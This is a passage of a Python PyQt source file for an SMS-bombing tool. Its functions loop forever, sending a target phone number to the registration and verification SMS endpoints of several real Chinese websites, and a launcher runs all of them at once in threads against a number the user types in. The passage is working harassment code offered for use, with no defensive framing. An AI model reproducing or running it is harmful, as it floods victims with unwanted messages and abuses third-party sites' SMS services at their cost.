                    print(data['msg'])
                    self.cursor.insertText(data['msg'])
                    print('金享会轰炸失败......\n\n')
                    self.cursor.insertText('金享会轰炸失败......\n\n')
                    time.sleep(30)
            except:
                print('金享会轰炸出错......\n\n')
                self.cursor.insertText('金享会轰炸出错\n\n')
                time.sleep(10)
                continue

    def boom18(self,phone):
        while True:
            try:
                url = 'http://www.jaja123.com/api/sms'
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
                    'content-type': 'application/json;charset=UTF-8',
                }
                data = requests.post(url, data=json.dumps({'mobile': phone, 'type': "reg"}), headers=headers).json()
                print(data)
                if data['status'] == 200:
                    global boom_num
                    boom_num = boom_num + 1
                    print('好美家轰炸成功......\n\n')
                    self.cursor.insertText('好美家轰炸成功......\n\n')
                    time.sleep(5)
                else:
                    print('好美家轰炸失败......\n\n')
                    self.cursor.insertText('好美家轰炸失败......\n\n')
                    time.sleep(5)
            except:
                print('好美家轰炸出错......\n\n')
                self.cursor.insertText('好美家轰炸出错\n\n')
                time.sleep(10)
                continue

    def boom19(self,phone):
        while True:
            try:
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
                }
                url = 'https://wap.taojiji.com/tjj_m/Tjj/Tjj/request/api_url/wap-user-msg/mobile/' + phone +'/mobile_id/e933ecd6-5e2f-b2c1-41a4e0777795/operate/35'
                data = requests.get(url, headers=headers).json()
                print(data)
                if data['result'] == 1:
                    global boom_num
                    boom_num = boom_num + 1
                    print('淘集集轰炸成功......\n\n')
                    self.cursor.insertText('淘集集轰炸成功......\n\n')
                    time.sleep(30)
                else:
                    print('淘集集轰炸失败......\n\n')
                    self.cursor.insertText('淘集集轰炸失败......\n\n')
                    time.sleep(10)
            except:
                print('淘集集轰炸出错......\n\n')
                self.cursor.insertText('淘集集轰炸出错......\n\n')
                time.sleep(10)
                continue

    def boom20(self,phone):
        while True:
            try:
                url = 'https://m.artand.cn/sms/nimabi?ni_zhe_yang_zhen_mei_yi_si'
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.1; PRO 6 Build/NMF26O; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/044030 Mobile Safari/537.36 MicroMessenger/6.6.6.1300(0x26060637) NetType/4G Language/zh_CN',
                }
                data = {
                    'mobile': phone,
                    'area': '86'
                }
                data = requests.post(url, data=data, headers=headers, verify=False).json()
                msg = data['msg']
                if msg == 60:
                    print('Artand轰炸成功......')
                    self.cursor.insertText('Artand轰炸成功......\n\n' % msg)
                    time.sleep(10)
                else:
                    print('Artand轰炸失败(%s)......' % msg)
                    self.cursor.insertText('Artand轰炸失败(%s)......\n\n' % msg)
                    time.sleep(10)
            except Exception:
                print('Artand轰炸出错......')
                self.cursor.insertText('Artand轰炸出错......\n\n')
                time.sleep(10)
                continue

    def boom21(self,phone):
        while True:
            try:
                url = 'http://www.tongrentangsxls.com/sms/sms.php?act=send&flag=register'
                data = requests.post(url, data={'mobile': phone, 'seccode': '', }).json()
                print(data)
                print('同仁堂轰炸成功......')
                self.cursor.insertText('同仁堂轰炸成功......\n\n')
                global boom_num
                boom_num = boom_num + 1
                time.sleep(10)
            except:
                print('同仁堂轰炸出错......')
                self.cursor.insertText('同仁堂轰炸出错......\n\n')
                time.sleep(10)
                continue

    def start_thread(self):
        phone = self.lineEdit.text()
        boomlist = [self.boom1,self.boom2,self.boom3,self.boom4,self.boom5,self.boom6,self.boom7,self.boom8,self.boom9,self.boom10,self.boom11,self.boom12,self.boom13,self.boom14,self.boom15,self.boom16,self.boom17,self.boom18,self.boom19,self.boom20,self.boom21,]
        for boom in boomlist:
            self.th = threading.Thread(target = boom,args = (phone,))
            self.th.setDaemon(True)
            self.th.start()


if __name__ == '__main__':
    '''
    主函数
    '''

    app = QApplication(sys.argv)
    mainWindow = QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(mainWindow)
    mainWindow.show()
    sys.exit(app.exec_())
